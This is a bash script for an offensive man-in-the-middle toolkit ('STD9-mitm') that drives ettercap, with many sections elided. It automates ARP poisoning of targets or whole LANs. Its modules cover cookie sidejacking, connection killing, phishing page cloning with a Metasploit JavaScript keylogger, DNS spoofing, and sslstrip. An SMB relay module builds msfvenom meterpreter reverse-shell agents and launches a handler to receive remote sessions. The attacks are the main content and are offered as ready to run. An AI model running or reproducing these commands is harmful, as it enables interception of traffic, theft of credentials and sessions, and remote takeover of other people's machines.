#!/bin/sh
###
# STD9-MITM - automated ettercap TCP/IP Hijacking tool
# Author: ZebliveD
#
#
# DESCRIPTION:
# STD9-MITM it's a Man-In-The-Middle suite that allows users to manipulate tcp/udp
...
IPATH=`pwd`                          # grab STD9-mitm.sh install path
...
cat << !
         ...
         ══════  ═════    99999     MM   MM  IIIII TTTTTTT MM   MM
███████ ║██████║║█████║   9   9     M M M M    I      T    M M M M
██╔════╝ ══██══ ║█    █║  99999     M  M  M    I      T    M  M  M
███████╗  ║██║  ║█    █║      9 @@@ M     M    I      T    M     M
╚════██║  ║██║  ║█    █║   9999     M     M    I      T    M     M
     ██║  ║██║  ║█    █║            M     M    I      T    M     M 
███████║  ║██║  ║█████ ╝            M     M    I      T    M     M
...
!
echo "${RedF}    STD9-mitm${white}©::${RedF}v$V3R${white}::${RedF}codename${white}::${RedF}oneiroi_phobetor${white}::${RedF}SuspiciousShellActivity${white}©"
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    |${YellowF}STD9-mitm its a Man-In-The-Middle (mitm) suite that allows users to ${BlueF}|"
...
echo ${RedF}[☠]${white} execute [ sudo ./STD9-mitm.sh ] on terminal ${Reset};
exit
fi
...
# we can use: ./STD9-mitm.sh -h for help menu
# ------------------------------------------
...
---
   ...
   STD9-mitm.sh framework automates tcp/udp packet manipulation tasks by using
   ...
   STD9-mitm ships with a collection of etter filters writen be me to acomplish
   ...
   it through STD9-mitm framework.
...
sleep 2
# run module?
rUn=$(zenity --question --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
...
fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter through STD9-mitm.\nchose gateway ip, if you dont have any more targets." --entry --width 270) > /dev/null 2>&1
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
    sleep 1
    # port-forward
  ...
  dd=`ls $IPATH/logs`
  if ! [ -z "$dd" ]; then
  Qu=$(zenity --info --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "logfiles stored $IPATH/logs" --width 270) > /dev/null 2>&1
  fi
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
  ...
  sleep 1
  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nChose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  FiLteR=$(zenity --title="☠ Enter COOKIE NAME ☠" --text "example:userid=\nIf you want to capture all cookies use:Cookie\nInput a cookie name to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  # replace values in template.filter with sed bash command
  cd $IPATH/filters
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/sidejacking.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling sidejacking.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/sidejacking.eft -o $IPATH/output/sidejacking.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 ...
 fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/packet_drop.eft"
  sleep 1

    # compiling packet_drop.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling packet_drop.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs
      ...
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "STD9-mitm - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -M ARP /$rhost// /$gateway//
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "STD9-mitm - TCPKILL [ctrl+c to abort]" -geometry 120x27 -e "tcpkill -i $InT3R -7 host $fil_one" & ettercap -T -Q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost// /$gateway//
        fi
...
xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/redirect.eft"
echo ${BlueF}[☠]${white} Compiling redirect.eft${RedF}!${Reset};
sleep 1
xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/redirect.eft -o $IPATH/output/redirect.ef && sleep 3"
...
echo "${BlueF}    | ${YellowF}    also store urls visited into STD9-mitm/logs/grab_hosts.log     ${BlueF}|"
echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
echo ""
sleep 2
# run module?
...
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  ...
  xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/grab_hosts.eft -o $IPATH/output/grab_hosts.ef && sleep 3"
  sleep 1
...
echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
echo "${BlueF}    | ${YellowF} HINT: STD9-mitm will store the captured images into logs/capture  ${BlueF}|"
...
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  ...
  xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/chat_services.eft -o $IPATH/output/chat_services.ef && sleep 3"
  sleep 1
...
UpL=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  ...
  xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/UserAgent.eft -o $IPATH/output/UserAgent.ef && sleep 3"
  sleep 1
...
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
      ...
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        xterm -T "STD9-mitm - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost// /$gateway// && sleep 3"
      else
        xterm -T "STD9-mitm - user-agent capture" -geometry 90x42 -e "ettercap -T -s 's(4)' --visual text -q -i $InT3R -F $IPATH/output/UserAgent.ef -M ARP /$rhost/ /$gateway/ && sleep 3"
      fi
...
cLon=$(zenity --title="☠ WEBPAGE TO CLONE ☠" --text "example: www.facebook.com\nchose domain name to be cloned." --entry --width 270) > /dev/null 2>&1
  ...
  wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js,.css,.gif $cLon | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="Cloning webpage: $cLon" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
...
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
      ...
      if [ "$IpV" = "ACTIVE" ]; then
        ...
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        xterm -T "STD9-mitm TCP/IP HIJACKING" -geometry 110x40 -e "sudo msfconsole -x 'use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $IP; set URIPATH support; exploit'" & ettercap -T -Q -i $InT3R -P dns_spoof -M arp /$rhost/ /$gateway/
      fi
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
  ...
  nmap -sV -PN -p 80 $GaTe -oN $IPATH/output/retrieve.log | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="Gather modem ip addr, mac addr and hostname .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
...
sleep 1
 ...
 fil_one=$(zenity --title="☠ TARGET HOST ☠" --text "example: $IP\nchose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/img_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling img_replace.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
    sleep 1
    #
    # port-forward
    #
...
sleep 1
 ...
 rep_two=$(zenity --title="☠ WORD TO REPLACE ☠" --text "previous word chosen: $rep_one\nRemmenber: world to be replaced must be of the same legth of the previous one" --entry --width 270) > /dev/null 2>&1
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/text_replace.eft"
  sleep 1

    # compiling img_replace.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling text_replace.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/text_replace.eft -o $IPATH/output/text_replace.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs
...
echo "${BlueF}    | ${YellowF}  STD9-mitm presents a 'template' previous build for you to write  ${BlueF}|"
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
  ...
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
  sleep 1


    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs
      ...
      if [ "$?" -eq "0" ]; then
        ...
        if [ "$?" -eq "0" ]; then
          xterm -T "STD9-mitm - warn.sh" -geometry 108x24 -e "cd $IPATH/bin && ./warn.sh" &
        else
...
echo "${BlueF}    | ${YellowF} we need to wait for 'STD9-mitm SCRIPTING CONSOLE' terminal windows${BlueF}|"
echo "${BlueF}    | ${YellowF} to delete the nº7 from the domain name (STD9-mitm add's nº 7 into ${BlueF}|"
...
# run module?
rUn=$(zenity --question --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "[ Devices DHCP discovery ]\nthis module allow users to filter any device\n(domain name OR ip addr) thats trying to access our local lan for the first time (auth)\n\nExecute this module?" --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


# chose to input one or two targets to filter
Tc=$(zenity --list --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text "This module allow users to filter one or two targets" --radiolist --column "Pick" --column "Option" TRUE "one target input" FALSE "two targets input" --width 300 --height 180) > /dev/null 2>&1
...
rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: android-c6216f4h7297e1ef\nchose remote target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
...
Desc=$(zenity --title="☠ DEVICE DESCRIPTION ☠" --text "Give a description of the device\nexample: cellphone (pedro)" --entry --width 270) > /dev/null 2>&1
  ...
  echo "    msg(\"[STD9-mitm] host:0.0.0.0 [ ⊶  ]  found ..\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[STD9-mitm] | status  : Request access to LAN\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[STD9-mitm] |   port  : 67/UDP(dst) bootp-DHCP ✔\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[STD9-mitm] |   id    : $twoop\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\"[STD9-mitm] |_  device: $Desc\");" >> $IPATH/filters/dhcp-discovery.eft
  echo "    msg(\".\");" >> $IPATH/filters/dhcp-discovery.eft
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/dhcp-discovery.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling dhcp-discovery.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/dhcp-discovery.eft -o $IPATH/output/dhcp-discovery.ef && sleep 3"
    sleep 1
    cd $IPATH/logs
      ...
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "STD9-mitm - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -M ARP /// ///
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "STD9-mitm - devices auth capture" -geometry 90x42 -e "cd $IPATH/bin && ./warn.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/dhcp-discovery.ef -L $IPATH/logs/dhcp-discovery.log -M ARP /// ///
        fi
...
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
crypto=$(zenity --title="☠ DOMAIN NAME TO FILTER ☠" --text "example: coin-hive.com\nchose the domain name to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose target to filter through STD9-mitm." --entry --width 270) > /dev/null 2>&1
  ...
  echo ${BlueF}[☠]${white} Edit template${RedF}!${Reset};
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/cryptocurrency.eft"
  sleep 1

    # compiling template.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling template${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/cryptocurrency.eft -o $IPATH/output/cryptocurrency.ef && sleep 3"
    sleep 1
    # port-forward
    # echo "1" > /proc/sys/net/ipv4/ip_forward
    cd $IPATH/logs
...
# compiling packet_drop.eft to be used in ettercap
xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/EasterEgg.eft"
echo ${BlueF}[☠]${white} Compiling EasterEgg.eft${RedF}!${Reset};
sleep 1
xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/EasterEgg.eft -o $IPATH/output/EasterEgg.ef && sleep 3"
echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
...
#
if [ "$Fail" = "YES" ]; then
  echo ${BlueF}[${RedF}x${BlueF}]${white} restarting STD9-mitm to finish installs ..${Reset};
  sleep 3
  exit
fi
...
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'STD9-mitm arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
  ...
  if [ "$IpV" = "ACTIVE" ]; then
    ...
    sleep 2
    xterm -T "STD9-mitm - dns2proxy" -geometry 90x26 -e "python $dnsproxypath" & python $stripath -l 10000 -a -w $IPATH/output/log.txt & ettercap -T -q -i $InT3R -M ARP /$rhost// /$gateway//
  else
    echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
    echo ${GreenF}[☠]${white} press [q] to quit arp poison ..${Reset};
    sleep 2
...
echo ""
echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
echo "${BlueF}    | ${YellowF}In STD9-mitm SMB Relay lateral movement attack we will need 2 pcs  ${BlueF}|"
...
# select RHOST ..
scnt=$(zenity --list --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "Scan LAN for active shares" FALSE "Input target ip address [RHOST]" --width 320 --height 200) > /dev/null 2>&1

if [ "$scnt" = "Scan LAN for active shares" ];then
  dtr=`date | awk {'print $4'}`
  ip_range=`ip route | grep "kernel" | awk {'print $1'}`
  nmap -sS -Pn -T4 -f --script smb-enum-shares.nse,smb-os-discovery.nse -p 445 $IP_RANGE -oN $IPATH/logs/SMBrelay.report | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan for shares" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
...
#
form=$(zenity --list --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text "\nAvailable agents:" --radiolist --column "Pick" --column "Option" TRUE "Build binary.exe agent" FALSE "Build VBScript agent" FALSE "Build powershell agent" --width 320 --height 230) > /dev/null 2>&1
if [ "$form" = "Build binary.exe agent" ]; then
  echo ${BlueF}[☠]${white} Building winhttps agent.exe ..${Reset};
  sleep 2
  xterm -T "STD9-mitm - BUILD AGENT.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f exe -n 20 -o $IPATH/output/agent.exe"
elif [ "$form" = "Build VBScript agent" ]; then
  echo ${BlueF}[☠]${white} Building winhttps agent.vbs ..${Reset};
  sleep 2
  xterm -T "STD9-mitm - BUILD AGENT.vbs" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/bin/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 -o $IPATH/output/chars.raw"
...
if [ "$form" = "Build binary.exe agent" ]; then
echo ""
python smbrelayx.py -h $rhost -e $IPATH/output/agent.exe & xterm -T "STD9-mitm - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
elif [ "$form" = "Build VBScript agent" ]; then
echo ""
python smbrelayx.py -h $rhost -e $IPATH/output/agent.vbs & xterm -T "STD9-mitm - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
else
echo ${BlueF}[☠]${white} Agent:${BlueF} $oneliner ${Reset};
sleep 2
echo ""
python smbrelayx.py -h $rhost -c "$oneliner" & xterm -T "STD9-mitm - MULTI-HANDLER" -geometry 124x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_http; set LHOST $lhost; set LPORT $lport; set HandlerSSLCert $IPATH/bin/www.gmail.com.pem; set StagerVerifySSLCert true; set EnableStageEncoding true; set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit'" > /dev/null 2>&1
fi
echo ""
...
# run module?
rUn=$(zenity --question --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "HTTP tcp Header Information Gathering\nExecute this module?" --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
...
#
Tc=$(zenity --list --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text "Chose the type of capture" --radiolist --column "Pick" --column "Option" TRUE "capture only ip source packets" FALSE "capture source and destination packets" --width 350 --height 190) > /dev/null 2>&1
if [ "$Tc" = "capture only ip source packets" ]; then
  ...
  cd $IPATH
  zenity --info --title="☠ STD9-mitm SCRIPTING CONSOLE ☠" --text "STD9-mitm framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
  xterm -T "STD9-mitm SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/IG.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling IG.eft${RedF}!${Reset};
    xterm -T "STD9-mitm - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/IG.eft -o $IPATH/output/IG.ef && sleep 3"
    sleep 1
    cd $IPATH/logs
      ...
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "STD9-mitm - http tcp header information gathering" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -M ARP /// ///
        else
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        xterm -T "STD9-mitm - http tcp header information gathering" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -L $IPATH/logs/IG.log -M ARP /// ///
        fi
...
sleep 2
# run module?
rUn=$(zenity --question --title="☠ STD9-mitm TCP/IP HIJACKING ☠" --text "Execute this module?" --width 320) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
...
if [ "$IPH_UA" = "YES" ]; then
  ...
  if [ "$Tc" = "Normal" ]; then
    nmap -sn $IP_RANGE -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Normal ].." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    ...
    nmap -sS $IP_RANGE -O -oN $IPATH/logs/lan.mop | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ Stealth ] .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    # strip results and print report
    ...
    nmap -sV -T4 -Pn -oN $IPATH/logs/lan.mop --script vuln $IP_RANGE | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning local lan [ NSE ] .." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    # strip results and print report
    ...
    nmap -sS -Pn --reason --data-length 25 -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ STD9-mitm TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
    # strip results and print report
    cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470 > /dev/null 2>&1
  fi
...
# -------------------------
sh_exit () {
echo ${BlueF}[☠]${white} Exit STD9-mitm framework...${Reset};
sleep 1
echo ${BlueF}[${GreenF}✔${BlueF}]${white} Revert ettercap etter.conf ${Reset};
mv /tmp/etter.conf $Econ > /dev/null 2>&1
sleep 1
...
echo ${RedF}STD9-mitm${white}©::${RedF}v$V3R${white}::${RedF}SuspiciousShellActivity${white}©::${RedF}RedTeam${white}::${RedF}2018  ${Reset};
exit
}
...
do
clear
echo "" && echo "${BlueF}                 ☆ Automated ettercap tcp/ip hijacking tool ☆${BlueF}"
cat << !
         ══════  ═════    99999     MM   MM  IIIII TTTTTTT MM   MM
███████ ║██████║║█████║   9   9     M M M M    I      T    M M M M
██╔════╝ ══██══ ║█    █║  99999     M  M  M    I      T    M  M  M
...
cat << !
    ...
    |   E    -  Exit/close STD9-mitm                                     |
    ╚───────────────────────────────────────────────────────────────────╣
!
echo "${YellowF}                                                       STD_${RedF}AnonymousTeam${YellowF}2019${BlueF}_⌋${Reset}"
